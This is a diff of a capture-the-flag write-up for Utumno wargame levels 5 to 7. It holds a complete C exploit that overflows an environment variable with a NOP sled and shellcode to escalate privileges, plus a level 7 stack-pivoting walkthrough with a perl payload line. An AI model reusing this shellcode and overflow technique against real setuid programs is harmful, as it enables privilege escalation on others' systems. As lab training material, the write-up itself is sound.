@@ -160,7 +160,7 @@ strcpy(0xffffddcc, "IIII" <no return ...>
 
 The strcpy will be able to overwrite the return address
 Constructing envp variable 9, which the program copies to be AAAABBBBCCCCDDDDEEEE...
-shows that the program segfaults on 0x45454545. This means that the 16 - 20th bytes of the 9th environment 
+shows that the program segfaults on 0x45454545. This means that the 16 - 20th bytes of the 9th env 
 variable overwrites the return address.
 We can place shellcode after the return address location. The new return address can now point to the shellcode
 
@@ -353,32 +353,32 @@ to point to environment variable which holds exploit.
 I find exploit environment variable address at: 0xffffdf3b ~ 0xffffdf40
 
 The final program which gives immediate priviledge escalation
-#include <unistd.h>
-int main() {
-  char *args[] = { NULL };
-  char *envp[] = { 
-    "AAAA",
-    "BBBB",
-    "CCCC",
-    "DDDD",
-    "EEEE",
-    "FFFF",
-    "AAAA",
-    "BBBB",
-    "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
-     \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
-     \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
-     \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
-     \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
-    NULL };
-  execve("/utumno/utumno5", args, envp);
-  return 0;
-}
+  #include <unistd.h>
+  int main() {
+    char *args[] = { NULL };
+    char *envp[] = { 
+      "AAAA",
+      "BBBB",
+      "CCCC",
+      "DDDD",
+      "EEEE",
+      "FFFF",
+      "AAAA",
+      "BBBB",
+      "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
+      "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
+       \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
+       \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
+       \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
+      NULL };
+    execve("/utumno/utumno5", args, envp);
+    return 0;
+  }
 
 ###################################################################################################
 
@@ -434,8 +434,81 @@ $ ./utumno6 -1 0xffffcf6c $(perl -e 'print "\xf0\xd1\xff\xff"')
 ###################################################################################################
 
 Level:    7
-Exploit:  
+Exploit:  buffer overflow/stack pivoting
 Password: 
+
+ghidra output:
+  int main(int argc,char **argv) {
+    if (argc < 2) {
+      exit(1);
+    }
+    puts("lol ulrich && fuck hector");
+    vuln(argv[1]);
+    return 0;
+  }
+
+  int vuln(char *arg) {
+    int iVar1;
+    char buf [128];
+    jmp_buf foo;
+    int i;
+    jbp = &foo;
+    iVar1 = _setjmp((__jmp_buf_tag *)foo);  <-- save pt
+    if (iVar1 == 0) {
+      strcpy(buf,arg);                      <-- overflow 
+      jmp(0x17);                            <-- teleport (rewinds stack to point at save pt)
+    }
+    return 0;
+  }
+
+The buffer overflow can overwrite these registers however EIP is unusable because of pointer 
+mangling (encrypted).
+Therefore instead of overflowing EIP, overwrite EBP with 144 bytes.
+
+    Lower address
++-------------------+ 
+|     buf[128]      |  -> overflow this 
++-------------------+ 
+|        EBX        |  -> +4 jmpbuf 
++-------------------+
+|        ESI        |  -> +8 jmpbuf 
++-------------------+
+|        EDI        |  -> +12 jmpbuf 
++-------------------+
+|        EBP        |  -> +16 jmpbuf 
++-------------------+
+|        ESP        |  -> jmpbuf (mangled)
++-------------------+
+|        EIP        |  -> jmpbuf (mangled)
++-------------------+
+|        ...        |
++-------------------+
+|        EBP        |  -> saved EBP of vuln function
++-------------------+
+|        EIP        |  -> saved EIP of vuln function (return address)
++-------------------+
+   Higher address
+
+Overwriting EBP allows for stack pivoting. When the vuln function ends, it will end with:
+1.   leave    mov ESP, EBP       restores ESP to EBP
+2.            pop EBP            pops the saved base pointer to EBP
+3.   ret      pop EIP            pops the value at the top of the stack, ESP to EIP, jumping to addr
+
+1. Since EBP is corrupted, leave instr will have ESP point to corrupted value
+2. First 4 bytes from corrupted stack pointer will be popped into EBP
+3. Next 4 bytes from curropted stack pointer will be popped into EIP
+
+Using GDB identify the addresses
+buf:     0xffffd1cc
+eip:     0xffffd1ec  (somewhere nice in the middle of NOP sled)
+
+The following works in gdb.
+	$(perl -e 'print "AAAA" . "\xec\xd1\xff\xff" . "\x90"x75 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c
+	 \x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71
+	 \x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
+	 . "\xcc\xd1\xff\xff"')
+
+Because of stack shifting, we will need to slightly adjust the FAKE EBP and FAKE EIP value.
 
 ###################################################################################################
 
